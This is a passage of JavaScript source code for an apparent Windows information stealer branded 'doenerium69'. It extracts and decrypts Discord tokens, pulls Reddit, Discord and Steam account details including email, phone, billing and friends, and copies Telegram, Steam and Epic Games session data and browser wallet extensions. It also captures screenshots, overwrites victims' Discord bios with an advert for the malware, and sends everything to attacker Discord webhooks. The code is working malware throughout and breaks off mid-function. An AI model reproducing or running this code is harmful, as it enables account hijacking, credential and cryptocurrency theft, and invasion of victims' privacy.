        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';

        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    'Authorization': `Bearer ${accessToken}`
                };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;
                        const profileUrl = `https://www.reddit.com/user/${username}`;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;
                        const suspended = userData.is_suspended;

                        const embedData = {
                            title: "",
                            description: "",
                            color: 0x303037, 
                            url: '',
                            timestamp: new Date().toISOString(),
                            fields: [
                { name: '<:cookie:1205123589930749995> Cookies', value: '```' + cookies + '```', inline: false },
                { name: '🌐 Profile URL', value: '```' + profileUrl + '```', inline: false },
                { name: '👤 Username', value: '```' + username + '```', inline: false },
                { name: '', value: '💬 Comments: ```' + commentKarma + '``` 👍 Total Karma: ```' + totalKarma + '```', inline: true },
                { name: '💰 Coins', value: '```' + coins + '```', inline: false },
                { name: '🛡️ Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
                { name: '🌟 Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
                { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                            ],
                            footer: {
                                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                            },
                            author: {
                                name: "Reddit Session Detected",
                                icon_url: "https://preview.redd.it/reddit-logo-changes-to-old-non-pixelated-logo-sign-of-v0-1povzsj8o0eb1.jpg?width=640&crop=smart&auto=webp&s=8bab770af358cf676163dbde410c9caa2b13cbe5"
                            }
                        };

                        axios.post(discordWebhookUrl, { embeds: [embedData] })
                            .catch(error => {
                                console.error('Error sending Discord webhook:', error.message);
                            });
                    })
                    .catch(error => {
                        axios.post(discordWebhookUrl, { content: 'Error retrieving user data: ' + error.message })
                            .catch(webhookError => {
                                console.error('Error sending Discord webhook:', webhookError.message);
                            });
                    });
            })
            .catch(error => {
                axios.post(discordWebhookUrl, { content: 'Error obtaining access token: ' + error.message })
                    .catch(webhookError => {
                        console.error('Error sending Discord webhook:', webhookError.message);
                    });
            });
    } catch (error) {
        axios.post(discordWebhookUrl, { content: 'An error occurred Rddit: ' + error.message })
            .catch(webhookError => {
                console.error('Error sending Discord webhook:', webhookError.message);
            });
    }
}

   
//
const tokens = [];

function findToken(path) {
  let path_tail = path;
  path += 'Local Storage\\leveldb';

  if (!path_tail.includes('discord')) {
    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith('.log') || file.endsWith('.ldb')) &&
          fs.readFileSync(path + '\\' + file, 'utf8')
            .split(/\r?\n/)
            .forEach((line) => {
              const patterns = [
                new RegExp(/mfa\.[\w-]{84}/g),
                new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm),
                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g),
              ];
              for (const pattern of patterns) {
                const foundTokens = line.match(pattern);
                if (foundTokens)
                  foundTokens.forEach((token) => {
                    if (!tokens.includes(token)) tokens.push(token);
                  });
              }
            });
      });
    } catch (e) {}
    return;
  } else {
    if (fs.existsSync(path_tail + '\\Local State')) {
      try {
        const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;

        fs.readdirSync(path).forEach((file) => {
          if (file.endsWith('.log') || file.endsWith('.ldb')) {
            const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
            const lines = fileContent.split(/\r?\n/);

            lines.forEach((line) => {
              const foundTokens = line.match(tokenRegex);

              if (foundTokens) {
                foundTokens.forEach((token) => {
                  const encryptedKey = Buffer.from(
                    JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key,
                    'base64'
                  ).slice(5);
                  const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
                  const tokenParts = token.split('.');
                  const start = Buffer.from(tokenParts[0], 'base64');
                  const middle = Buffer.from(tokenParts[1], 'base64');
                  const end = Buffer.from(tokenParts[2], 'base64');
                  const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                  decipher.setAuthTag(end);
                  const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');

                  if (!tokens.includes(out)) {
                    tokens.push(out);
                  }
                });
              }
            });
          }
        });

        const discordFolderPath = path.join(mainFolderPath, 'Discord');
        const discordFilePath = path.join(discordFolderPath, 'discord.txt');
        const discordFileContent = tokens.join('\n');

        // Create Discord folder if it doesn't exist
        if (!fs.existsSync(discordFolderPath)) {
          fs.mkdirSync(discordFolderPath);
        }

        fs.writeFileSync(discordFilePath, discordFileContent);
      } catch (e) {}
      return;
    }
  }
}

async function getUserData(token) {
    try {
        const userResponse = await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });

        const userData = userResponse.data;

        if (!userData) return null;

        const id = userData.id;
        const username = userData.username;
        const discriminator = userData.discriminator;
        const avatar = userData.avatar;
        const email = userData.email;
        const phone = userData.phone;
        const mfa_enabled = userData.mfa_enabled;
        const flags = userData.flags;
        const premium_type = userData.premium_type;
        const bio = userData.bio;

        return {
            id,
            username,
            discriminator,
            avatar,
            email,
            phone,
            mfa_enabled,
            flags,
            premium_type,
            bio
        };
    } catch (error) {
        console.error(error);
        return null;
    }
}

async function getTokens() {
    const interceptedTokens = [];

    for (let path of paths) {
        await findToken(path);
    }

    const predefinedBio = `╔═══════════✧✧✧═══════════╗        **This free virus can bypass all antivirus !                  ⭐️https://t.me/doenerium69** ⭐️ ╚═══════════✧✧✧═══════════╝`;

    for (let token of tokens) {
        try {
            const userData = await getUserData(token);

            if (!userData) continue;

            const phoneNumber = userData.phone || "None";
            let newBio = null;

            if (phoneNumber !== "None") {
                newBio = await updateBio(token, predefinedBio);
            }

            interceptedTokens.push(token);
            const hqGuilds = await getHQGuilds(token);
            const ip = await getIp();
            const billing = await getBilling(token);
            const friends = await getRelationships(token);
            const currentBio = userData.bio|| "None";

            const randomString = crypto.randomBytes(16).toString('hex');

            const userInformationEmbed = {
                title: `${userData.username}#${userData.discriminator} (${userData.id})`,
                color: 0x303037,
                author: {
                    name: "Discord Session Detected",
                    icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
                },
                thumbnail: {
                    url: `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}?size=512`
                },
                fields: [
                    {
                        name: ":key: Token:",
                        value: "```" + token + "```",
                    },
                    {
                        name: ":envelope: Email:",
                        value: "``" + `\`${userData.email}\`` + "``",
                        inline: true
                    },
                    {
                        name: ":globe_with_meridians: IP:",
                        value: "``" + `\`${ip}\`` + "``",
                        inline: true
                    },
                    {
                        name: "<:mobile88:1210411486120517663> Phone:",
                        value: "``" + `\`${phoneNumber}\`` + "``",
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:all_discord_badges_gif:1157698511320653924> **Badges:** ${getBadges(userData.flags)}`,
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:nitro_boost:877173596793995284> **Nitro Type:** ${await getNitro(userData.premium_type, userData.id, token)}`,
                        inline: true
                    },
                    {
                        name: "",
                        value: `<a:Card_Black:1157319579287179294> **Billing:** ${billing}`,
                        inline: true
                    },
                    {
                        name: ":shield: HQ Guilds:",
                        value: hqGuilds,
                        inline: true
                    },
                ],
                footer: {
                    text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                    icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                }
            };

            const data = {
                embeds: [userInformationEmbed],
            };

            if (friends !== '*Nothing to see here*') {
                const friendsEmbed = {
                    title: "Friends",
                    color: 0x303037,
                    description: friends,
                    author: {
                        name: "HQ Friends",
                        icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
                    },
                    footer: {
                        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                    }
                };
                data.embeds.push(friendsEmbed);
            }

            if (newBio !== null) {
                userInformationEmbed.fields.push({
                    name: "<a:aa_star_black:1157319572328808449> New About me:",
                    value: "```\n" + newBio + "\n```",
                });
            } else if (currentBio !== null) {
                userInformationEmbed.fields.push({
                    name: "<a:aa_star_black:1157319572328808449> About me:",
                    value: "```\n" + userData.bio + "\n```",
                });
            }
            await axios.post(discordWebhookUr1, data);
            await axios.post(discordWebhookUrl, data);
        } catch (error) {
            console.error(error);
        }
    }
}

async function updateBio(token, newBio) {
    try {
        const url = 'https://discord.com/api/v9/users/@me/profile';
        const payload = { bio: newBio };
        const headers = { authorization: token.trim() };

        const response = await axios.patch(url, payload, { headers });

        if (response.status === 200) {
            console.log(`Bio updated for token: ${token}`);
            return newBio;
        } else {
            console.log(`Failed to update bio for token: ${token}`);
            return null;
        }
    } catch (error) {
        console.error(`An error occurred while updating bio: ${error.message}`);
        return null;
    }
}

async function getHQGuilds(token) {
    try {
        const response = await axios.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });

        const hqGuilds = response.data.filter(guild => guild.permissions === "562949953421311");

        if (hqGuilds.length === 0) {
            return "```No HQ Guilds```";
        }

        let result = "\n";

        for (const guild of hqGuilds) {
            const invites = await getGuildInvites(token, guild.id);
            const invite = invites.length > 0 ? `[Join Server](https://discord.gg/${invites[0].code})` : "No Invite";

            const ownerOrAdmin = guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin";

            result += `${ownerOrAdmin} | \`${guild.name} - Members: ${guild.approximate_member_count}\` - ${invite}\n`;

            if (result.length >= 1024) {
                return "\`Too many servers to display.\`";
            }
        }

        return result;
    } catch (error) {
        console.error(error);
        return "Error retrieving HQ Guilds";
    }
}

async function getGuildInvites(token, guildId) {
    try {
        const response = await axios.get(`https://discord.com/api/v8/guilds/${guildId}/invites`, {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });

        return response.data;
    } catch (error) {
        console.error(error);
        return "No Invite";
    }
}




const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = "```No Billing```";
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return "```No Badges```";
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "```No Nitro```";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}

////


async function Killchrome() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['discord.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}


async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}

function copyFolder(source, destination) {
  if (!fs.existsSync(destination)) {
    fs.mkdirSync(destination);
  }

  const files = fs.readdirSync(source);

  files.forEach(file => {
    const currentSource = path.join(source, file);
    const currentDestination = path.join(destination, file);

    if (fs.lstatSync(currentSource).isDirectory()) {
      copyFolder(currentSource, currentDestination);
    } else {
      fs.copyFileSync(currentSource, currentDestination);
    }
  });
}

function copyGames(source, destination) {
  try {
    fs.mkdirSync(destination, { recursive: true }); 
  } catch (err) {
    console.error(`Error creating directory ${destination}: ${err.message}`);
    throw err;
  }

  const files = fs.readdirSync(source);

  files.forEach(file => {
    const currentSource = path.join(source, file);
    const currentDestination = path.join(destination, file);

    if (fs.lstatSync(currentSource).isDirectory()) {
      copyFolder(currentSource, currentDestination);
    } else {
      fs.copyFileSync(currentSource, currentDestination);
    }
  });
}


const logFilePath = path.join(mainFolderPath, 'debug.log');

function redirectErrorsToLog() {
    const originalConsoleError = console.error;

    console.error = function (message) {
        const formattedMessage = `${new Date().toISOString()} - ${message}\n`;

        fs.appendFile(logFilePath, formattedMessage, (err) => {
            if (err) {
                console.error('Erreur lors de l\'écriture dans le fichier de log :', err);
            }
        });

        originalConsoleError.apply(console, arguments);
    };
}

async function SubmitTelegram() {
    try {
        const sourcePath = `${process.env.APPDATA}\\Telegram Desktop\\tdata`;

        try {
            await fsPromises.access(sourcePath);
        } catch (error) {
            console.error(`Error accessing source path: ${error.message}`);
            return;
        }

        const destinationPath = path.join(mainFolderPath, 'Telegram');

        exec("taskkill /IM Telegram.exe /F", (error, stdout, stderr) => {});
        await new Promise(resolve => setTimeout(resolve, 4000));
        addFolder(path.join('Telegram'));

        const blacklistFolders = ["emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"];

        const files = await fsPromises.readdir(sourcePath);

        for (const file of files) {
            if (!blacklistFolders.includes(file)) {
                const sourceItemPath = path.join(sourcePath, file);
                const targetItemPath = path.join(destinationPath, file);

                try {
                    const isDirectory = (await fsPromises.stat(sourceItemPath)).isDirectory();

                    if (isDirectory) {
                        await fsPromises.mkdir(targetItemPath, { recursive: true });
                        await copyFolderContents(sourceItemPath, targetItemPath);
                    } else {
                        await fsPromises.copyFile(sourceItemPath, targetItemPath);
                    }
                } catch (err) {
                    console.error(`An error occurred: ${err}`);
                }
            }
        }

        console.log('Telegram session data copied to mainFolder/Telegram');
    } catch (error) {
        console.error(`Error in SubmitTelegram: ${error.message}`);
    } finally {
        await archiveAndSendData();
    }
}

async function copyFolderContents(source, target) {
    const files = await fsPromises.readdir(source);

    for (const file of files) {
        const sourceItemPath = path.join(source, file);
        const targetItemPath = path.join(target, file);

        const isDirectory = (await fsPromises.stat(sourceItemPath)).isDirectory();

        if (isDirectory) {
            await fsPromises.mkdir(targetItemPath, { recursive: true });
            await copyFolderContents(sourceItemPath, targetItemPath);
        } else {
            await fsPromises.copyFile(sourceItemPath, targetItemPath);
        }
    }
}



async function StealEpicGames() {
    try {
        const epicPath = path.join(localappdata, 'EpicGamesLauncher', 'Saved');
        const copiedPath = path.join(mainFolderPath, 'Epic Games');

        if (fs.existsSync(epicPath)) {
            if (!fs.existsSync(copiedPath)) {
                fs.mkdirSync(copiedPath, { recursive: true });
            }

            const epicSubfolders = ['Config', 'Data', 'Logs'];

            epicSubfolders.forEach(subfolder => {
                const sourcePath = path.join(epicPath, subfolder);
                const destinationPath = path.join(copiedPath, subfolder);

                try {
                    copyGames(sourcePath, destinationPath, { recursive: true });
                    console.log(`Copied ${subfolder} to ${copiedPath}`);
                } catch (err) {
                    console.error(`An error occurred while copying ${subfolder}: ${err.message}`);
                }
            });

            const howToUseContent = `<================[t.me/doenerium69 Stealer]>================>\n\n
Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
delete everything and copy all contents into the Epic Games folder and run.`;

            const howToUseFilePath = path.join(copiedPath, 'How to Use.txt');

            fs.writeFileSync(howToUseFilePath, howToUseContent, { encoding: 'utf8' });
            await new Promise(resolve => setTimeout(resolve, 3000));
            console.log('Epic Games "How to Use" file created in mainFolder/Epic Games');
        }
    } catch (error) {
        console.error(`Error in StealEpicGames: ${error.message}`);
    }
}

async function SubmitSteam() {
  try {
    var exists = false;

    if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
      exists = true;
      exec("taskkill /IM Steam.exe /F", (error, stdout, stderr) => {});
      await new Promise(resolve => setTimeout(resolve, 2500));
    } else {
      exists = false;
    }

    if (exists) {
      const steamFoldersToCopy = ["userdata", "config"];

      steamFoldersToCopy.forEach(folder => {
        const sourcePath = path.join("C:\\Program Files (x86)\\Steam", folder);
        const destinationPath = path.join(mainFolderPath, 'Steam', folder);

        try {
          copyGames(sourcePath, destinationPath);
          console.log(`Copied ${folder} to ${mainFolderPath}/Steam`);
        } catch (err) {
          console.error(`An error occurred while copying ${folder}: ${err.message}`);
        }
      });

      console.log('Steam session data copied to mainFolder/Steam');
    }
  } catch (error) {
    console.error(`Error in SubmitSteam: ${error.message}`);
  }
}

async function stealSteamSession() {
    try {
        if (fs.existsSync("C:\\Program Files (x86)\\Steam") && fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
            const accounts = fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
            const accountIds = accounts.match(/7656[0-9]{13}/g) || [];

            for (const account of accountIds) {
                try {
                    const { data: { response: accountInfo } } = await axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
                    const { data: { response: games } } = await axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
                    const { data: { response: level } } = await axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);

                    const webhookPayload = {
                        embeds: [
                            createSteamEmbed(account, accountInfo, games, level)
                        ]
                    };

                    await axios.post(discordWebhookUr1, webhookPayload);
                    console.log('First Steam session detected embed sent to webhook.');

                    // Add a delay of 2 seconds
                    await new Promise(resolve => setTimeout(resolve, 2000));

                    await axios.post(discordWebhookUrl, webhookPayload);
                    console.log('Second Steam session detected embed sent to webhook.');
                } catch (error) {
                    console.error(`An error occurred while processing Steam account ${account}: ${error.message}`);
                }
            }
        }
    } catch (error) {
        console.error(`Error in stealSteamSession: ${error.message}`);
    }
}


function createSteamEmbed(account, accountInfo, games, level) {
    return {
        title: '',
        color: 0x303037,
        author: {
            name: "Steam Session Detected",
            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/1024px-Steam_icon_logo.svg.png"
        },
        thumbnail: {
            url: accountInfo.players[0].avatarfull,
        },
        fields: [
            {
                name: "Steam Identifier",
                value: "```" + `${account}` + "```",
                inline: true
            },
            {
                name: "Profile URL",
                value: `[Click here](${accountInfo.players[0].profileurl})`,
                inline: true
            },
            {
                name: "Display Name",
                value: "```" + `${accountInfo.players[0].personaname}` + "```",
                inline: true
            },
            {
                name: "Time created",
                value: "```" + `${accountInfo.players[0].timecreated || "Private"}` + "```",
                inline: true
            },
            {
                name: "Level",
                value: "```" + `${level.player_level || "Private"}` + "```",
                inline: true
            },
            {
                name: "Game count",
                value: "```" + `${games.game_count || "Private"}` + "```",
                inline: true
            }
        ],
        footer: {
            text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
    };
}


async function createScreenshotScript() {
    const outputPath = path.join(mainFolderPath, 'Screenshots');
    if (!fs.existsSync(outputPath)) {
        fs.mkdirSync(outputPath);
    }
    const scriptContent = `
try {
    # Capture screenshots of all screens
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Get all screens
    $screens = [System.Windows.Forms.Screen]::AllScreens

    # Calculate the total width and maximum height of all screens
    $totalWidth = ($screens | ForEach-Object { $_.Bounds.Width } | Measure-Object -Sum).Sum
    $maxHeight = ($screens | ForEach-Object { $_.Bounds.Height } | Measure-Object -Max).Maximum

    # Check if the calculated values are valid
    if ($totalWidth -le 0 -or $maxHeight -le 0) {
        throw "Error: Unable to calculate valid screen dimensions."
    }

    # Try to create a bitmap with a PixelFormat argument
    try {
        $combinedScreenshot = New-Object System.Drawing.Bitmap $totalWidth, $maxHeight, ([System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
    } catch {
        throw "Error creating Bitmap object: $_"
    }

    # Try to create a graphics object
    try {
        $graphics = [System.Drawing.Graphics]::FromImage($combinedScreenshot)
    } catch {
        throw "Error creating Graphics object: $_"
    }

    # Capture the screen images and paste them onto the combined screenshot
    $offsetX = 0
    foreach ($screen in $screens) {
        $screenScreenshot = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height

        # Try to create a graphics object for the screen
        try {
            $screenGraphics = [System.Drawing.Graphics]::FromImage($screenScreenshot)
        } catch {
            throw "Error creating screen Graphics object for $($screen.DeviceName): $_"
        }

        $screenGraphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        $graphics.DrawImage($screenScreenshot, $offsetX, 0)
        $offsetX += $screen.Bounds.Width
    }

    # Save the combined screenshot to a file
    $outputPath = "${mainFolderPath}\\Screenshots\\Screenshot.png"

    try {
        # Créer le répertoire si nécessaire
        $outputDirectory = [System.IO.Path]::GetDirectoryName($outputPath)
        if (-not (Test-Path -Path $outputDirectory)) {
            New-Item -ItemType Directory -Force -Path $outputDirectory
        }

        # Convertir l'image en tableau de bytes et le sauvegarder directement
        $imageBytes = [System.IO.MemoryStream]::new()
        $combinedScreenshot.Save($imageBytes, [System.Drawing.Imaging.ImageFormat]::Png)
        [System.IO.File]::WriteAllBytes($outputPath, $imageBytes.ToArray())
        Write-Host "Combined screenshot saved to: $outputPath"
    } catch {
        # Gérer les erreurs et afficher le message d'erreur spécifique
        throw "Error saving the combined screenshot: $($_.Exception.Message)"
    }
} catch {
    Write-Host "Error occurred: $_"
}
    `;
    const scriptPath = path.join(user.temp, 'CaptureScreens.ps1');
    try {
        await fs.promises.writeFile(scriptPath, scriptContent);
        return scriptPath;
    } catch (error) {
        console.error(`Error writing PowerShell script: ${error.message}`);
        throw error; 
    }
}



async function archiveAndSendData() {
    let zipFilePath;
    const outputPath = path.join(mainFolderPath, 'Screenshots');
    const scriptPath = await createScreenshotScript(outputPath);
    try {
        await new Promise(resolve => setTimeout(resolve, 4000));
        const walletsFolder = path.join(mainFolderPath, 'Wallets');
        if (!fs.existsSync(walletsFolder)) {
            fs.mkdirSync(walletsFolder);
        }
        for (let [extensionName, extensionPath] of Object.entries(extension)) {
            for (let i = 0; i < browserPath.length; i++) {
                let browserFolder;
                if (browserPath[i][0].includes('Local')) {
                    browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
                } else {
                    browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
                }
                const browserExtensionPath = path.join(browserPath[i][0], extensionPath);
                if (fs.existsSync(browserExtensionPath)) {
                    const walletFolder = path.join(walletsFolder, `${extensionName}_${browserFolder}_${browserPath[i][1]}`);
                    copyFolder(browserExtensionPath, walletFolder);
                }
            }
        }
        for (let [walletName, walletPath] of Object.entries(walletPaths)) {
            if (fs.existsSync(walletPath)) {
